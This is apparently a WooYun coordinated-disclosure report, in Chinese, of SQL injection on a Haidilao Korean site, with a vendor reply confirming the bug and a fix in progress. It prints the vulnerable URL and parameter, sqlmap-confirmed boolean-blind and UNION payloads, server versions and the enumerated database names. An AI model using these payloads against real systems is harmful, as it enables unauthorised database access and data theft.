wybug_detail:
漏洞详情 披露状态：   									2015-12-22：	细节已通知厂商并且等待厂商处理中									2015-12-22：	厂商已经确认，细节仅向厂商公开									2016-01-01：	细节向核心白帽子及相关领域专家公开									2016-01-11：	细节向普通白帽子公开									2016-01-21：	细节向实习白帽子公开									2016-02-04：	细节向公众公开  简要描述： 海底捞某站存在sql注入 详细说明：  海底捞某站存在sql注入网站地址：http://kr.haidilao.com漏洞地址：http://kr.haidilao.com/index.php/About/load
sqlmap identified the following injection points with a total of 24 HTTP(s) requests:---Place: POSTParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=5 AND 9190=9190    Type: UNION query    Title: MySQL UNION query (NULL) - 22 columns    Payload: id=5 LIMIT 1,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONCAT(0x3a756a653a,0x536a6a64476e4f567751,0x3a6a76643a), NULL, N---[20:41:33] [INFO] testing MySQL[20:41:34] [INFO] confirming MySQL[20:41:35] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.2.6, Apache 2.2.9back-end DBMS: MySQL >= 5.0.0[20:41:35] [INFO] fetching database namesavailable databases [4]:[*] h_hdl[*] information_schema[*] mysql[*] test
 好了，就这些吧！不在深入   漏洞证明：  海底捞某站存在sql注入网站地址：http://kr.haidilao.com漏洞地址：http://kr.haidilao.com/index.php/About/load
sqlmap identified the following injection points with a total of 24 HTTP(s) requests:---Place: POSTParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=5 AND 9190=9190    Type: UNION query    Title: MySQL UNION query (NULL) - 22 columns    Payload: id=5 LIMIT 1,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONCAT(0x3a756a653a,0x536a6a64476e4f567751,0x3a6a76643a), NULL, N---[20:41:33] [INFO] testing MySQL[20:41:34] [INFO] confirming MySQL[20:41:35] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.2.6, Apache 2.2.9back-end DBMS: MySQL >= 5.0.0[20:41:35] [INFO] fetching database namesavailable databases [4]:[*] h_hdl[*] information_schema[*] mysql[*] test

wybug_reply: 漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-12-22 12:28 厂商回复： 谢谢，我们已安排人员进行修复。 最新状态： 暂无
